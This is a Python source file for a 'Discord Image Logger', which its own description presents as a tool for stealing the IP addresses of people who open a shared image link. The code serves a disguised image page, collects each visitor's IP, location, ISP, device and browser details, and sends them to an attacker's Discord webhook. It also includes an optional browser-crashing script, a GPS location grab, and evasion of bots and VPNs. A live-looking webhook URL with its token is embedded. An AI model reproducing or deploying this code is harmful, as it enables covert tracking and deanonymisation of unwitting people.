# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1105183211090346036/ww-MTGN5JzhrgRsRAI7gW8rC9lR3ERmEFvAk5YYraaOQewF8B3k5Eq6G7VjU8ihSXBGQ",
    "image": "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBxAPDw8NDxAPDQ0NDQ0NDQ0NEA8NDw0NFREWFhURFRUYHSggGBolGxUVITEhJSkrLi4uFx8zODMsNygtLisBCgoKDg0OFRAPFS0aFx0rLystKy0tKystKystLSstKy0tLS0tLS0tLSstLS0rLSstKy0tKy0rLS0rLS0rKy0rLf/AABEIAOAA4AMBEQACEQEDEQH/xAAbAAADAQEBAQEAAAAAAAAAAAAAAQIDBAUGB//EAD0QAAIBAwEEBgcHAgYDAAAAAAABAgMEERIFITFRBhMiQWFxMlJTgZGi0RQVFkKhscFi4TNDY3KCkgcjc//EABoBAQEBAQEBAQAAAAAAAAAAAAABAgMEBQb/xAAoEQEAAgEDBAIBBAMAAAAAAAAAAQIRAxIxBCFBURMyFAVCYXEiodH/2gAMAwEAAhEDEQA/APQiz7T84cnkCWAgoAAABMBFBgijAAAmBJVIIWAowAYAMAGADADSAAioxyBrGaW5IzhVOuybTMsm8msIEUWGAAAILkEXIAAhMoQDQUyAANJMqhookoaQCaAQDAAAAKBAVkgYCwEUkFMiKZWCCkAAACAYCAADAVpTpuTwlkzNojlqImeHbS2c3xfdwXM4zrQ7V0JZV7OUOOPcarqRLNtO1U29LMuGS3nslI7umvbat25YOVb4draeXOrdRab3+B03TPDntxywuVv5eBuvDE8sMG2TwMgwAYIDBQ8AGAGkEMgaWQG4gMrBBAFGAE0DJBSAAADajKPBr3mLZ8NVmPL1LTTFbjzXzMvXp7Y4dtOaOMw9ETCK2GaqlnJOKi9XA6RmYw4zEVnKZ1Of6FiqTbLnqVEvE6REuU2hxTeXk7RGHJOCgwAYIDADwUBEAAUCQRomTC5IIrAZS0UAQgGQTgq5IKMAPABESOy1ms8jjerrS3d6VOqjzzWXrraESnvyWISZc91NtG6Q5XnMOFzZ3w4bpZyZROCorAFRp5M5XDWla974GZv6bintNWnyWCxPtm0MZRNsDBQ0iAwA8APADQDaDBNAS0VAFACAMBQgK1EwZPPgRSbAqFaS7yTWJWLzAlVk+8sVhd0yXWPgxtg3SWShAAF0547jM1ysThXWeBNq7mkbgzNGouxqTbZutcMWtlODTIwAwBACiBtToN+C5mJvEN1pMnVppbuLFZmS1YhmzTiloqEVCCkA8ALAUYAQDyRcrdTO7CJtXc0pWdSXCOFze45216V5l2p0urb9uP7dMNlvvkl5LJxnq48Veqv6fb91sNVsuPrS92EY/Lt6h1j9Pp5tJ/dkPWl+n0J+Xb1C/gafuf8AX/B93x7n8VkflW8wk9DXxLGps6Xc4v4o6V6qvmHK3QXjiYc87Sa4xz5bzrXXpPlwt0urX9rBr3HZ557cnofxJlVaMcSZMEkaygaAqMV3kkPC7iKeMeIODVR8CbTdISyODlbtpE+SE+KzOUcbmt5qJyzMTHaUM0yWkGCwVCCgBogeQrW3ttb5RXF/wjjq60Uj+Xp6fpp1ZzxV6dKnGHopLx7/AInz76lr8y+zp6NNP6w11mHRSkBSYABLAhsCXICKiUuKTNVtNeJwxbTrf7RlzVLbvi8eD+p6adT4vDxanRedOXHKLTw9zPZW0TGavnXpas4tGJDiXLMmyBFQAyaQDwQUmMJlU6zfgSKQttSZZSeeJpiZyQAAmUJoBYACo0oU9T38Fx8Thr63xx/MvX0vTfNac8Q71NLctyR8yZmZzL7kRERiOB1gU1UApVQLVYDxtt7eqUpqhQoyq1ZrKk90IkHBUrbUhHrtVKphZdBJp48GB27D6R0ruLX+HWjuqUpelF/yUeq6gE9YAusAmUk9z3mq2ms5iWL6dbxi0ZYTp44Pce7S14v2ntL5PUdLbT7171Tg7vGMBBgpkyGRgDWNPdlmZs3FO3dng05ALlOCoWAEAFUgAC4TwsI+XrX3Xl97pdL49KI8z3VrZyek9TANbANbAfWMBdZ8QB1gPA21sKFeXXU5OhcLhUhuz5gY7IvL6FVULiEatPD/APfF44c0B9D1wC60A60BdcEmInlcHk+no6m+ufL4XU6HxXx4nhWDq82DUSLhpGJmZbiFaSZawGISWJtxACwAYAWChYANIXEplwZjUtisy6aFd2pWqYHyn6NogGAAAAwMLmqoxk20sRb4ruQH5PX6XXcak3Gp2dTwms7iD2+jHS24uK8aNSMZKXetzQH3Eijg2ptONvFSmpOLym0m1HxYGFlt+3rYVOrFt8FneQdzrFCdcDS2usTS7pNRZ10b7bf28/U6UX059x3eukj6Hd8TsaiMmDwRTyMGSKjMrkAFguQYJkDSC9ggRML1GcOm/wBOetw82cuonFMPR0MbtbPpMTwPtrQDAAADk2jayqx0xnKnzceIHhPofTbbnWrTzxWpog8y4/8AHlJ+jWnHzSkBhY9FLixqfaKMqdw0mtEswYH2cG3GLaw3FNrk8cCjwelu06dKhVpyklUnSloi+/uIPyNPHmB+n9HbaqrejU6+b1QTlCp217nxQHq1JFHPK60vPJpiOUmM9n3M4LuPo1tL4lqR4Rg1lymDwVBgMmBMqb5Ei0E6cp0Pky5TbIdN8hug+OfQS8MhYiI8NKTiuK+Jm27xLpTZHMNJxg1wS8UYibOlq6cw5Zx38ztEvLauJ7MK/FI8vVW4h9L9Nr97f1BRPI+opAMAAAEwJYEMCGBnIDnrUYS3yjGXdvSe4DyL7o5aVc6qMU+cOywPOoWNe0mo05ddat40Sxqh5Mg9aqyjzb17mB+i28exDPHq4ZxwzpR7qz2fI1KxMq0m8vPt9FoLmE2z6GBlnB6RkmuFOOO9nPOfDttx5TraNYiWd0wanzJMNRb2Wpchgi0ei3F7s9vKHA1uYmmeC0lyzhyV3mT8Ejxa85s+x0dcaefYRxes0AwABAJgSwIYESAiQGUgMpgYTYHJWYHn1oa5Rh684x+LwEnh+naUj15l8zERzIyixEk2rBTawWImGLWpMYZ4OkS4TEeJPATt6LqznudpoWgu5naTWBlJrgsGss4gaeQyu30GmMwmLFpLlNsvPbzJvxZ4Lzm0vt6VdtKx/CkZdFIAAAEAmBLAhgRIDOQGcgMZgYVAOOswMdnw13VCP+rF8uG/+DVPtDnqziln6Lg9r4/cYCTEjBcptNRJk2jSMmGesxh2yWsYMk55GCbZNPwKmBkJwTKiZvCb5JskziGq1zaIebA8T7K0BSAAABASwJYEMCJAZyAzkBjMDCoBx12Bp0bhqvaf9KnLnwX9zen9nLWn/CX3qR6XzrTKtJWczJ4GWcSMDJtPSMmHOYdsQn3FTtBqo13Ewu7HhOSoMhMFkqYlldy7L8cIxqTirroVzeHFE8z6S0BSAAEwEwEwJYEMDNgRIDKQGMwOeoBx12B6HQunm6qS9Sk/i5I6aXLz9T9Yh9ujvl4doGTaETK7TGTaeBuX42GkGC0BMFoGQaBlcFoKYGkmRybQ3KK5tv4HPUns9HTR3mXNE4vYoBgACATAlgSwIYEMDOQGUgMZgc9QDirsD2eglPtXM/8A5RXP8zf8HXT8vN1Hh9dg6vMMAGAh4GVwNITCtJlcDSUwWkINIUtIMDSDDzNqvEoL+l/uctTmHq6fiXOjm9CgGAgACQOPaW0qVvHXVmoR8eLA8yh0tsanCvGL/rzED0KW0KM/Qq05eU4gasCJAZSAwmBz1GBw3DA+p6CUsW9SXr1pfpFL6nXT4eXW+z6XQdHEaAHpANIBgD5iW1avNfA82XvxHovvSrzXwGTEei+9KvrfohkxHpyX22q8XBRnjKm3uXdj6li0wk6dZ5hz/f1z7T5Y/Qu6U+Knoff1z7T9IjdKfFT0dPadSpLNSWppYjuSwSZmeWq1ivDvpXBGnRGsBoqiAeQBgIDxdobBhcVNdducE+xT7kBnX6KWU1h0IeceywPKr9ALN74urTfhLP7kHLLoTVhvoX1WHhLVj9GAvura1L0LuFXwmvqBMrra9P0qNKr4xwBnLpDfR/xLGT5uLf0YHRsrb32icqU6U6FSMdWmee0vgUdVy9wHTszaNalTUKdSUI5csLHF+4sTMMzSs8w61tu59tL5foN0nx19L/EF17T5Yl3T7T4q+j/EF17T5YjdJ8VfRfiC69p8sRuk+Kvo10guvafLEbpPip6amWwAAeftB9tLlD93/YDmCgBSk12l3fsEdNveJriB207kDojcAaxrgWq4D64B9aAusQCc0BLkBnJgZTAxmwPOuLWLqRq/nims80wOW7e4Doo201GPYnwX5JBWqs6rWVTqY56JfQCJUpLjGSzzi0BGQAAA+qWyJd8o+7LCH9zy9dfBgUtj/wCp8v8AcDnrdHNctTq4WEsaOX/IBfhmPtZf9F9QKj0Zh31JvyUUA/w1S9pU+X6AfM7b2VK0nlZlSl6M/H1X4gctK8a4gddO8A6IXQGyuQLVwA1cAP7QAvtACdwBErgDOVyBhUugOSreAY2sXVqRi1lak5LnFb2B97Tv5v8ALj3gdMK8n3AbRkwG6afGMX4NJgZTsaT40oPm9CAxlsig/wDKj7soDuksAIAAAEAsAJxAzq26knGSUovinvTA8uv0Zt5flcHzg2gOKr0Ph+StOP8AuUZfQDCXRKsvRrQl/ujKP1Ah9HLpcHTl5Sa/dAQ9i3a/y08+rOLA4LqVSjLTVhKD7tSwn5PvAy+2AH2wCXdgQ7oDOVw2Bm5tgSB9b0X2X1adepulOOIRfdHm/MD6FSiuQFfaIIBO+ggJltKIFUdpJ5WM7twHNV2k02sAes1kCHEA0gGkA0gPQAaADSA8IBbgDUgJdVAS68QMq9WnOLjNRnF8YySaYHz990ftptuEpUXyXbj8H9QPEudg1IejKNVeHZfwYHn1rWpDfKEorm1u+IGQABpb286jxCLfj3LzYHt7P2Yqfanic+71Y/UD1HVk+8BanzAAABgb2b7XuYEXC3gfSUd4BVmk8AZO4QEu6QEO8QGcr5AZyv0BnLaAES2gwM3esCHdyAh3EuYEuq+YEuT5sBAAAwOaVjSfGnH3LACjY0lwpx96yBvGKSwkkuSWEAwEAwGgABgbWvpr3gF1xA9Dr2kBxVbmTYGbrS5gS5vmAsgIBAAAAAAAAAAAAAACAAEAAAAA0AAMDS3faj5gaXa3gdNTgBwS4gIAAAEAAAAAAAAAAAAAAACAAABAAAA0AANAVS9JeaA6LwDas9wHCwEAgAAAAAAAAAAAAAAAAABAAAAAIAAaAAACo8V5oDqu+AH/2Q==", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": True, # Enable the custom message?
        "message": "Your ip is [ip]", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
